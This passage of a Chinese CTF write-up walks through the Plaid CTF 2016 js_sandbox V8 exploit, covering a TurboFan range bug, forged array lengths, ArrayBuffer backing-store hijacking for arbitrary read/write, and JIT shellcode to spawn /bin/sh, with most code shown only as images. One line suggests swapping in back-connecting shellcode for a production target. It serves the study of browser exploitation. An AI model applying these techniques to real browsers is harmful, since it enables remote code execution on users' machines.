id="JSArrayBuffer-1"><a href="#JSArrayBuffer-1" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h4><ul><li>持有ArrayBuffer的对象<ul><li>继承Object，HeapObject，JSReceiver，JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-155703.png" alt=""></li></ul></li></ul></li><li>实际演示<ul><li>存放TypedArray</li><li>使用长度0x13370搜索ArrayBuffer的内存位置<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-160126.png" alt=""></li><li>在V8中，对象通常被存放在由GC管理的mapped区域，然而BackingStore是一个不被GC管理的区域，并且被存放在heap中(在图中，可以看到malloc块有prev_size和size成员）<br>此外，由于它不是由GC管理的HeapObject，因此指向BackingStore的指针不是Tagged Value（末尾不能为1）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-160917.png" alt=""></li><li>虽然在ArrayBuffer中描述了大小，但如果将此值重写为较大的值，则可以允许读取和写入的长度，超出BackingStore数组的范围。</li><li>同样，如果您可以重写BackingStore指针，则可以读取和写入任意内存地址，这些是在exploit中常用的方法。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-162614.png" alt=""></li></ul></li></ul><h3 id="Numerical-conversion-tool-It-is-original-work"><a href="#Numerical-conversion-tool-It-is-original-work" class="headerlink" title="Numerical conversion tool (It is original work)"></a>Numerical conversion tool (It is original work)</h3><ul><li>在开始JavaScript利用之前<ul><li>频繁转换unsigned long long &lt;-&gt; double</li><li>预先制作转换工具很好</li><li>我制作了以下工具（我不会使用float，但只是为了确保）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-163249.png" alt=""></li></ul></li><li>源代码看起来像这样<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-163655.png" alt=""></li></ul><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><ul><li>Plaid CTF 2016 -Pwnables 666pts –js_sandbox<ul><li>下载链接<br><a href="https://goo.gl/Se5HTy" target="_blank" rel="noopener">https://goo.gl/Se5HTy</a></li><li>问题<br>Can you get a flag off of this site(<a href="http://js.pwning.xxx:27251/)?" target="_blank" rel="noopener">http://js.pwning.xxx:27251/)?</a><br>If so, I’ve got 666 points with your name on it!</li></ul></li></ul><h2 id="攻略方法-1"><a href="#攻略方法-1" class="headerlink" title="攻略方法"></a>攻略方法</h2><ul><li>模式1和2，策略如下</li></ul><ol><li>创建一个用于调试的js环境版本<br>如果有一个包含漏洞的patch，hit和build它。</li><li>分析patch以确定哪个patch适用于哪个进程<br> Full-Codegen, Crankshaft, TurboFan, Ignition, AST, IC, …<br> Full-Codegen and Crankshaft do not exist in V8 as of 2018 (see below)</li><li>编写利用漏洞的js代码段<br> Think JavaScript code that causes patched parts to pass and causes bugs</li><li>创建一个任意地址读/写的原语<br> 主要使用ArrayBuffer和TypedArray</li><li>getshell<br> 由于这是Pwn类别的问题，getshell是第一目标。<br> 在JIT区域嵌入shell代码经常被使用</li></ol><h2 id="初步调查"><a href="#初步调查" class="headerlink" title="初步调查"></a>初步调查</h2><ul><li>Plaid CTF 2016-Pwnable 666pts -js_sandbox<ul><li>访问<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-084413.png" alt=""></li></ul></li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-084947.png" alt=""><br><a href="http://js.pwning.xxx:27251/files/problem.patch" target="_blank" rel="noopener">http://js.pwning.xxx:27251/files/problem.patch</a><br><a href="https://developers.google.com/v8/" target="_blank" rel="noopener">https://developers.google.com/v8/</a><br><a href="http://js.pwning.xxx:27251/file" target="_blank" rel="noopener">http://js.pwning.xxx:27251/file</a><br>提供了5个文件作为capture的必要文件。</p><ol><li>libc.so.6<br>当前的libc（ubuntu14.04)</li><li>natives_blob.bin<br>shell操作所需的文件</li><li>problem.patch<br>有漏洞的v8 patch</li><li>shell<br>构建samples/shell.cc用于本地测试</li><li>snapshot_blob.bin<br>shell操作所需的文件</li></ol><h2 id="shell文件"><a href="#shell文件" class="headerlink" title="shell文件"></a>shell文件</h2><p>shell (and *.blob)用作debug的目的<br>distribution file应该包含与problem服务器相同的源文件<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-091059.png" alt=""></p><ul><li>V8解释和执行的是JavaScript<ul><li>因此，exploit也只需要用JavaScript编写</li></ul></li><li>对于相同的输入，V8应该表现相同<ul><li>如果你可以通过shell来exp v8，你也可以通过Web服务器exp v8<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-092056.png" alt=""></li></ul></li></ul><h2 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h2><ol><li>启用PIE，FORTIFY_SOURCE，stack canary<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-092935.png" alt=""></li><li>PIE，FULL-RELRO启用<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-093123.png" alt=""></li><li>使read和load函数无效<br>print，read，load，quit和version等功能都是在sample/shell.cc中专门定义的，但是经过patch后，read和load时会失效<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-093555.png" alt=""></li><li>从源代码路径，TurboFan相关补丁和猜测<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-093840.png" alt=""><br>lhs：左手侧（左侧）rhs：右手侧（右侧）？<br>此外，因为函数名称是JSAddRanger，所以可以预料可能是与加法有关的漏洞（？）</li></ol><h2 id="Identification-of-calling-conditions"><a href="#Identification-of-calling-conditions" class="headerlink" title="Identification of calling conditions"></a>Identification of calling conditions</h2><ul><li>假设被patch的函数是有漏洞的<ul><li>我想调用这个函数<ul><li>如果我们不能调用这个函数，我们不能触发漏洞</li></ul></li><li>怎么调用它？<ul><li>我没有任何提示，我只有一个函数名称</li><li>猜测这个函数所在的文件或目录有什么功能</li><li>从该函数的调用回溯，找到调用路径。</li><li>最终目标是找到读取和调用每个函数的条件。</li></ul></li></ul></li></ul><h3 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h3><p>尝试google搜索函数名称<br>触及此功能的评论页尤为重要<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-101230.png" alt=""></p><h3 id="确认内置漏洞的文件名"><a href="#确认内置漏洞的文件名" class="headerlink" title="确认内置漏洞的文件名"></a>确认内置漏洞的文件名</h3><ul><li>src/compiler/typer.cc<ul><li>由于它是src/compiler/下的一个文件，因此它被认为与TurboFan有关<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-104240.png" alt=""></li></ul></li></ul><h3 id="确定来源"><a href="#确定来源" class="headerlink" title="确定来源"></a>确定来源</h3><ul><li>检查修补程序周围的代码<ul><li>看看JSAddRanger()<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-104616.png" alt=""></li></ul></li></ul><h3 id="确定调用路径"><a href="#确定调用路径" class="headerlink" title="确定调用路径"></a>确定调用路径</h3><ul><li>到目前为止，做一个总结<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-104852.png" alt=""></li><li>寻找调用路径<ul><li>使用gdb回溯调用栈是最快的方法。</li></ul></li><li><p>编写测试代码</p><ul><li>准备Javascript code去调用TurboFan<ul><li>通过代码调用函数10000次，由于我想调用TurboFan，所以不要忘记使用with语句<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-111002.png" alt=""></li></ul></li></ul></li><li><p>使用gdb运行</p><ul><li>如果某些条件不满足，JSAddRanger（）将不会调用…</li><li>In C ++ that does not reach JSAddRanger () in test code, that is, it does not reach the JSAddRanger () in the test code, you can not set a breakpoint unless you specify not only the function name but also the namespace and type to which it belongs. So using nm, it searches for mangled function names and specifies a breakpoint (if PIE is invalid, it is OK even if you set a breakpoint at the found address)</li><li>实际上，您无法在测试代码中访问JSAddRanger（）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-134138.png" alt=""></li></ul></li><li>调用JSAddRanger（）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-134445.png" alt=""><br>图示第一行是函数原型，第二行是函数定义，看看第三行。<ul><li>从JSAddTyper()调用。<ul><li>除非满足某些条件，否则不会调用JSAddRanger()<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-134751.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-134814.png" alt=""></li></ul></li></ul></li><li>同时检查JSAddTyper()的调用者<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-134854.png" alt=""><ul><li>在函数定义中只找到一个地方<ul><li>由于无法用简单的grep找到它，因此很有可能涉及宏。<ul><li>追溯更多来源是很麻烦的</li></ul></li></ul></li><li>在JSAddTyper()上放置一个断点并查看是否能在测试代码中断下来<ul><li>如果没有断下，努力尝试，阅读源码，进一步回溯</li></ul></li><li>使用gdb运行<ul><li>在JSAddTyper()上放置一个断点,发现停在断点处<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-135415.png" alt=""></li></ul></li></ul></li><li>在停止后进行回溯（查看调用栈）<ul><li>从这个函数名，可以确认JSAddRanger()和JSAddTyper()与优化编译器（TurboFan）相关<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-140004.png" alt=""></li><li>由于它是TyperPhase::Run，证明它是一个关于TurboFan优化中“Typer”阶段的函数。<br>另外，如果TurboFan进行了优化编译运行，就会发现JSAddTyper()在测试代码中被调用。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-140235.png" alt=""></li></ul></li><li>您可以在TyperPhase中看到TurboFan的功能<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-140844.png" alt=""></li><li>到目前为止做一个总结<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-141035.png" alt=""></li><li>JSAddRanger()调用条件探索<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-141136.png" alt=""><ul><li>lhs-&gt; IsRange（）&amp;&amp; rhs-&gt; IsRange（）</li><li>首先，代码中出现的Range是什么？<ul><li>为了知道这一点，我们需要更多地了解TurboFan的优化机制</li></ul></li></ul></li></ul><h3 id="Typer和Range调查"><a href="#Typer和Range调查" class="headerlink" title="Typer和Range调查"></a>Typer和Range调查</h3><ul><li>了解V8的优化（特别是Typer和Range相关）<ul><li>GitHub中有很多链接，从上往下依次阅读<ul><li><a href="https://github.com/v8/v8/wiki/TurboFan" target="_blank" rel="noopener">https://github.com/v8/v8/wiki/TurboFan</a><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-143220.png" alt=""></li></ul></li></ul></li><li>和Typer有关的材料<ul><li>TurboFan概述<ul><li><a href="https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/</a><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-143941.png" alt=""></li></ul></li><li>Typer收集类型信息并在其他地方完成优化<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-144124.png" alt=""></li></ul></li><li>TurboFan’s JIT Design<ul><li><a href="https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/edit#slide=id.p" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/edit#slide=id.p</a><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-144643.png" alt=""></li><li>当JavaScript代码中的变量或值不确定时，表示可以读取的范围的变量或值可以作为范围读取</li><li>据此，JSAddRanger()在添加带有范围信息的不定变量时,会派生出一个新的范围<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-151437.png" alt=""></li></ul></li><li>Fast arithmetic for dynamic languages<br><a href="https://docs.google.com/presentation/d/1wZVIqJMODGFYggueQySdiA3tUYuHNMcyp_PndgXsO1Y/edit#slide=id.p" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1wZVIqJMODGFYggueQySdiA3tUYuHNMcyp_PndgXsO1Y/edit#slide=id.p</a><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-151643.png" alt=""><br>虽然它没有直接解释范围，但根据该图，似乎在使用AND操作时变成范围（可能是“％”，这也在MOD操作中）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-152135.png" alt=""></li></ul><h3 id="确定调用条件"><a href="#确定调用条件" class="headerlink" title="确定调用条件"></a>确定调用条件</h3><ul><li>编写测试代码<ul><li>添加AND操作并在gdb下执行<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-152345.png" alt=""></li><li>在此之后，在断点处停止<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-152445.png" alt=""></li></ul></li><li>调用路径总结<br>  <img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-152615.png" alt=""></li></ul><h2 id="漏洞理解"><a href="#漏洞理解" class="headerlink" title="漏洞理解"></a>漏洞理解</h2><ul><li>补丁周围的代码<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-153051.png" alt=""></li><li>从操作实例理解<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-153234.png" alt=""></li><li><p>用make x64.debug -j 8重新编译</p><ul><li>在“环境设置”描述的步骤中，我已经预先构建了它。</li></ul></li><li><p>尝试有趣的测试case</p><ul><li>下面的JavaScript代码展示了有趣的结果<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-153628.png" alt=""></li><li>如果打了有漏洞的补丁，你会在AND操作之后得到新的范围信息，<strong>而这个范围信息是错误的</strong></li><li><strong>但是，由于该信息仅用作类型提示，因此它不会对选择Word32的类型造成影响，因为它可以用32位表示[0,24]和[0,16]。在这个例子里，f函数正常应该返回24作为结果</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-154204.png" alt=""></li></ul></li></ul><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p><a href="https://gist.github.com/sroettger/d077d3907999aaa0f89d11d956b438ea" target="_blank" rel="noopener">https://gist.github.com/sroettger/d077d3907999aaa0f89d11d956b438ea</a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>通过假的range信息，你能做什么？<ul><li>这里的目标是创建任意地址读/写的原语</li><li>具体来说，就是伪造一个很大的array的length<ul><li>许多JavaScript引擎的漏洞利用都是使用这种方法。</li></ul></li><li>OOB-RW (Out-Of-Bounds-Read/Write access)</li><li>如果在array之外读写数据，并劫持JSArrayBuffer的BackingStore的指针，就获胜。</li></ul></li><li>如何用OOB-RW创建任意地址读/写的原语<ul><li>内存排布如下<br>  <img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-155748.png" alt=""></li><li>如果可以模拟长度，就可以通过越界访问来更改JSArrayBuffer的BackingStore的指针<br><strong>基本形式如下</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-160205.png" alt=""></li></ul></li><li>通过range来实现我们的目的（改大array的length）<ul><li>正确的尝试<ul><li>首先用范围信息创建一个值</li><li>使用这个值来创建一个array</li></ul></li><li>测试代码看起来像这样<ul><li>变量sz具有范围信息<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-160615.png" alt=""></li></ul></li><li>修改源代码为有漏洞的版本<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-161055.png" alt=""></li><li>make x64.debug -j 8再次编译</li></ul></li><li>在gdb下运行，检查内存<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-161251.png" alt=""><ul><li>搜索0xdeadbee将命中3次，其中这个是一个数组（= FixedArray）</li><li>通过将标记值1加到FixedArray的地址上，然后进行搜索</li><li>找到的地址应该是JSArray<br><strong>一个很重要的图</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-163558.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-163924.png" alt=""><br>通过check我知道我能伪造FixedArray的长度，因为如果不打patch，上下的值应该都是0x18<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-164259.png" alt=""></li></ul></li><li>这意味着什么？<ul><li>我们打算创建一个长度0x18元素的数组，但实际上只准备了长度0x10元素的数组<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-165817.png" alt=""><br><strong>虽然它与基本形式稍有不同，但如果您仅信任此长度（0x18)，并将这个长度的值写入FixedArray，则您能够读取和写入的数据，将会超出原本仅有0x10的FixedArray</strong><br>实际上想用只有0x8个字节的数据来覆盖backing store ptr是十分困难的，我们将在后面介绍更好的方法。</li></ul></li></ul><h2 id="参考解说：typed-lowering"><a href="#参考解说：typed-lowering" class="headerlink" title="参考解说：typed-lowering"></a>参考解说：typed-lowering</h2><ul><li>为什么会出现这种情况？<ul><li>使用range信息的部分在哪里？<ul><li>在typer phase旁边的typed-lowering phase<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-170659.png" alt=""></li></ul></li></ul></li><li><p>typed-lowering</p><ul><li>它似乎使用type information来optimize graph</li><li>Follow until array association comes out<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-171104.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-171205.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-171313.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-171354.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-171702.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-171753.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-172100.png" alt=""></li></ul></li><li><p>用printf调试确认<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-172253.png" alt=""></p></li></ul><h2 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h2><ul><li>你现在在做什么？<ul><li>Array length伪造</li></ul></li><li>我们将会考虑编写exp<ul><li>流程如下<ol><li>伪造Array length</li><li>伪造ArrayBuffer</li><li>Identify function object</li><li>在JIT区域嵌入shellcode</li></ol></li></ul></li></ul><h3 id="伪造Array-length"><a href="#伪造Array-length" class="headerlink" title="伪造Array length"></a>伪造Array length</h3><ol><li>顺次排列两个FixedArray（其长度通过range漏洞伪造）<br>由于这些FixedArrays的范围是伪造的，因此它们可以在数组之外进行读写操作.<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-173202.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-173214.png" alt=""></li><li>每个double值存储在Element [0]中，并且数组类型被识别为double类型（即FixedArray被转换为FixedDoubleArray）<ul><li>在FixedArray变成FixedDoubleArrayed之后，内存的布局会发生变化并且变的很麻烦，所以让我们先提前认识它是一个只有double类型元素的FixedDoubleArray。<br>这也确保了FixedDoubleArray 1和2连接<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-173539.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-173723.png" alt=""></li></ul></li><li>使用OOB-W漏洞更新FixedDoubleArray1中的FixedDoubleArray 2的kLengthOffset<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-173919.png" alt=""><br>如果连续排列，FixedDoubleArray 1的元素[17]应该是kLengthOffset。<br>通过此更新，FixedDoubleArray 2可以越界读取和写入了。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-174210.png" alt=""><br>其实我们不能直接访问Element [17]。</li></ol><ul><li>状态<br>在JSArray中，长度信息首先存储在两个地方。JSArray::kLengthOffset(= 24)和FixedArray::kLengthOffset(=16)</li><li>原因<br>当存储到一个数组时，它使用JSArray::kLengthOffset和FixedArray::kLengthOffset来进行索引的范围判断（可以确认的是，如果你通过gdb上的rwatch设置了一个内存访问断点，它将以任一方式停止）<br>17超出了FixedArray::kLengthOffset的范围，所以我们扩展了数组的长度并在其他地方预留了一个新数组。这不会成为OOB-RW。</li><li>解决方法<br>According to Write-up, it seems to be enough to substitute twice in the for statement as follows<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for(var i=0;i&lt;24;i+=17)</span><br><span class="line">    Element[i]=value;</span><br></pre></td></tr></table></figure></li></ul><p>称为KeyedStore IC的IC对应于数组元素中的存储，KeyedStoreIC是状态直接转换为(0)-&gt;(1)的IC，IC在第二次访问时已处于活动状态.<br>当通过触发IC来处理时,它不会与JSArray::kLengthOffset或FixedArray::kLengthOffset进行比较（However, this is not exactly confirmed here, and only JSArray :: kLengthOffset comparison may be done on the code embedded in JIT）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-184255.png" alt=""></p><h3 id="伪造ArrayBuffer"><a href="#伪造ArrayBuffer" class="headerlink" title="伪造ArrayBuffer"></a>伪造ArrayBuffer</h3><ol><li>将ArrayBuffer放置在FixedDoubleArray 1，2之后<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-184358.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-184411.png" alt=""></li><li><p>由FixedDoubleArray 2的漏洞搜索kByteLengthOffset和kBackingStoreOffset的偏移量</p><ul><li>它每次从FixedArray2的元素[16]中读取一个元素，并根据是否包含假定值进行搜索。 您可以在kByteLengthOffset（= ArrayBuffer拥有的BackingStore的长度）中放入一个特征值并搜索它（如果向此添加1，kBackingStoreOffset的偏移量也是已知的）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-184618.png" alt=""></li><li>ab_off表示从FixedArray 2（代码中的arr [1]）中看到的作为kByteLengthOffset位置的元素索引，</li></ul></li><li><p>更新来kByteLengthOffset和kBackingStoreOffset的偏移量</p><ul><li>如果设置元素[kByteLengthOffset_offset] = 0xfffff0，<br>元素[kByteLengthOffset_offset + 1] = rw_addr。<br>请记住在步骤2-2中获得的偏移量，并且在ArrayBuffer读取和写入rw_addr，也就是说，它几乎变成了任何内存读/写的原语。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-185130.png" alt=""></li><li>通过重写kBackingStoreOffset的值，您可以读取和写入任意地址，因此在利用时可以将其作为RW原语的函数来实现。<br>另外，关于i2_to_d()的描述被省略了，它是一个函数，可以使用ArrayBuffer将Uint32转换为double。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-185551.png" alt=""></li></ul></li></ol><h3 id="Identify-function-object"><a href="#Identify-function-object" class="headerlink" title="Identify function object"></a>Identify function object</h3><ol><li><p>ArrayBuffer后面跟着FixedArray 3，它有一个适当的函数对象作为元素<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-185739.png" alt=""><br>选择7作为特征值没有特别的意义。 只要选择你喜欢的长度，然后尝试。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-185837.png" alt=""></p></li><li><p>从FixedDoubleArray 2中，使用漏洞探索FixedArray 3的Element的偏移量，获取函数f的对象地址。</p><ul><li>如果一个值连续出现kLengthOffset次（如图中是7），则可以推断出它可能是包含函数f的对象地址的元素的偏移量。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-190158.png" alt=""></li></ul></li></ol><h3 id="在JIT区域嵌入shellcode"><a href="#在JIT区域嵌入shellcode" class="headerlink" title="在JIT区域嵌入shellcode"></a>在JIT区域嵌入shellcode</h3><ol><li>通过将函数f的对象地址放入kBackingStoreOffset并读取第七个元素，获取kCodeEntryOffset中的JIT地址<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-190809.png" alt=""></li><li>将该地址放在kBackingStoreOffset中，用shellcode覆盖JIT区域，然后调用函数f（）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-190858.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-191057.png" alt=""></li></ol><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><ul><li>I am rewriting a part of the author’s write-up<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-191201.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-191534.png" alt=""></li><li>Execute exploit code with V8 sample-shell<ul><li>你可以确认/bin/sh启动<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-191712.png" alt=""></li><li>虽然以上是针对自建shell执行的，即使对distributed shell执行了exploit代码，也应该启动/bin/sh</li><li>Then replace it with the shellcode to be backconnected, then try exploit to the production is OK</li></ul></li><li>除了本文中讨论的解决方案之外，PPP还使用GC实现了另外一种writeup<ul><li><a href="https://rzhou.org/~ricky/pctf2016/js_sandbox.js" target="_blank" rel="noopener">https://rzhou.org/~ricky/pctf2016/js_sandbox.js</a></li><li>但是，从range伪造，到进行数组的OOB-RW的思路是相同的</li></ul></li></ul><h1 id="Bonus-Other-JavaScript-issues-and-links"><a href="#Bonus-Other-JavaScript-issues-and-links" class="headerlink" title="Bonus Other JavaScript issues and links"></a>Bonus Other JavaScript issues and links</h1><h2 id="V8"><a href="#V8" class="headerlink" title="V8"></a>V8</h2><ul><li>[SECUINSIDE 2014] Yet another Javascript jail - 300<br><a href="https://gist.github.com/anonymous/b2340ac8429f4c5d186c" target="_blank" rel="noopener">https://gist.github.com/anonymous/b2340ac8429f4c5d186c</a><br><a href="http://ddaa.logdown.com/posts/203080-secuinside-2014-pwn-300-yet-another-javascript-jail" target="_blank" rel="noopener">http://ddaa.logdown.com/posts/203080-secuinside-2014-pwn-300-yet-another-javascript-jail</a><br><a href="https://gist.github.com/potetisensei/9a41a1848da4021c29e5" target="_blank" rel="noopener">https://gist.github.com/potetisensei/9a41a1848da4021c29e5</a></li><li>[34c3 CTF 2017] v9<br><a href="https://github.com/saelo/v9" target="_blank" rel="noopener">https://github.com/saelo/v9</a><br><a href="https://gist.github.com/itsZN/9ae6417129c6658130a898cdaba8d76c" target="_blank" rel="noopener">https://gist.github.com/itsZN/9ae6417129c6658130a898cdaba8d76c</a></li></ul><h2 id="SpiderMonkey"><a href="#SpiderMonkey" class="headerlink" title="SpiderMonkey"></a>SpiderMonkey</h2><ul><li>[33c3 CTF 2016] pwn600 -feuerfuchs<br><a href="https://github.com/saelo/feuerfuchs" target="_blank" rel="noopener">https://github.com/saelo/feuerfuchs</a><br><a href="https://bruce30262.github.io/2017/12/15/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" target="_blank" rel="noopener">https://bruce30262.github.io/2017/12/15/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/</a></li><li>[CodeGate 2017] JS World -pwnable500<br><a href="https://gist.github.com/akiym/966b3d24146edb685b8a08edee551de2" target="_blank" rel="noopener">https://gist.github.com/akiym/966b3d24146edb685b8a08edee551de2</a></li></ul><h2 id="Chakra"><a href="#Chakra" class="headerlink" title="Chakra"></a>Chakra</h2><ul><li>[PlaidCTF 2017] Chakrazy -Pwnable600<br><a href="https://lokalhost.pl/ctf/pcft2017_chakra.js" target="_blank" rel="noopener">https://lokalhost.pl/ctf/pcft2017_chakra.js</a><br><a href="https://bruce30262.github.io/2017/12/26/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" target="_blank" rel="noopener">https://bruce30262.github.io/2017/12/26/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/</a><br><a href="https://gist.github.com/eboda/18a3d26cb18f8ded28c899cbd61aeaba" target="_blank" rel="noopener">https://gist.github.com/eboda/18a3d26cb18f8ded28c899cbd61aeaba</a></li></ul><h2 id="WebKit-JSC"><a href="#WebKit-JSC" class="headerlink" title="WebKit-JSC"></a>WebKit-JSC</h2><ul><li>[BkP CTF 2016] qwn2own -pwn10<br><a href="https://github.com/kitctf/writeups/blob/master/bkp2016/qwn2own/index.html" target="_blank" rel="noopener">https://github.com/kitctf/writeups/blob/master/bkp2016/qwn2own/index.html</a><br><a href="https://rzhou.org/~ricky/bkpctf2016/qwn2own/test.js" target="_blank" rel="noopener">https://rzhou.org/~ricky/bkpctf2016/qwn2own/test.js</a><br><a href="http://vulph.com/2016/03/05/Boston-Key-Party-writeups.html" target="_blank" rel="noopener">http://vulph.com/2016/03/05/Boston-Key-Party-writeups.html</a><br><a href="https://github.com/acama/ctf/tree/master/bkpctf2016/qwn2own" target="_blank" rel="noopener">https://github.com/acama/ctf/tree/master/bkpctf2016/qwn2own</a><br><a href="http://lokalhost.pl/ctf/bkp2016/http://blog.frizn.fr/bkpctf-2016/qwn2own-bkpctf16" target="_blank" rel="noopener">http://lokalhost.pl/ctf/bkp2016/http://blog.frizn.fr/bkpctf-2016/qwn2own-bkpctf16</a></li></ul><h2 id="v8-exploit-study"><a href="#v8-exploit-study" class="headerlink" title="v8 exploit study"></a>v8 exploit study</h2><ul><li><a href="https://cansecwest.com/slides/2017/CSW2017_QidanHe-GengmingLiu_Pwning_Nexus_of_Every_Pixel.pdf" target="_blank" rel="noopener">https://cansecwest.com/slides/2017/CSW2017_QidanHe-GengmingLiu_Pwning_Nexus_of_Every_Pixel.pdf</a></li><li><p><a href="https://github.com/secmob/pwnfest2016/" target="_blank" rel="noopener">https://github.com/secmob/pwnfest2016/</a></p></li><li><p><a href="https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit" target="_blank" rel="noopener">https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit</a></p></li><li><a href="http://cygx.mydns.jp/blog/?arti=527" target="_blank" rel="noopener">http://cygx.mydns.jp/blog/?arti=527</a></li><li><a href="http://researchcenter.paloaltonetworks.com/2014/12/google-chrome-exploitation-case-study/" target="_blank" rel="noopener">http://researchcenter.paloaltonetworks.com/2014/12/google-chrome-exploitation-case-study/</a></li><li><a 